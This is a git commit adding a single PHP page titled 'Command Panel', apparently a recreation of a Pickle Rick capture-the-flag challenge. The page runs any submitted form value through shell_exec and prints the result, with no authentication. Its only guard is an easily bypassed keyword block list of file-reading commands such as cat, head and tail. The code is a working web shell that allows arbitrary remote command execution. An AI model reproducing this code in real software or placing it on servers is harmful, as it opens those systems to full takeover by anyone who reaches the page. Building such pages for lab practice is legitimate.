8b4a09e693f4ec1754e081e27977609be69d3b2f
L'morphine <mrprint405@gmail.com>
2024-10-30 15:30:17 -0400

    Add files via upload

---
+++ php.php
@@ -0,0 +1,39 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Terminal</title>
+</head>
+<body>
+
+
+  <div class="container">
+    <form name="input" action="" method="post">
+      <h3>Command Panel</h3></br>
+      <input type="text" class="form-control" name="command" placeholder="Commands"/></br>
+      <input type="submit" value="Execute" class="btn btn-success" name="sub"/>
+    </form>
+    <?php
+      function contains($str, array $arr)
+      {
+          foreach($arr as $a) {
+              if (stripos($str,$a) !== false) return true;
+          }
+          return false;
+      }
+      // Cant use cat
+      $cmds = array("cat", "head", "more", "tail", "nano", "vim", "vi");
+      if(isset($_POST["command"])) {
+        if(contains($_POST["command"], $cmds)) {
+          echo "</br><p><u>Command disabled</u> to make it hard for future <b>PICKLEEEE RICCCKKKK</b>.</p><img src='assets/fail.gif'>";
+        } else {
+          $output = shell_exec($_POST["command"]);
+          echo "</br><pre>$output</pre>";
+        }
+      }
+
+    ?>
+  </div>
+</body>
+</html>
+
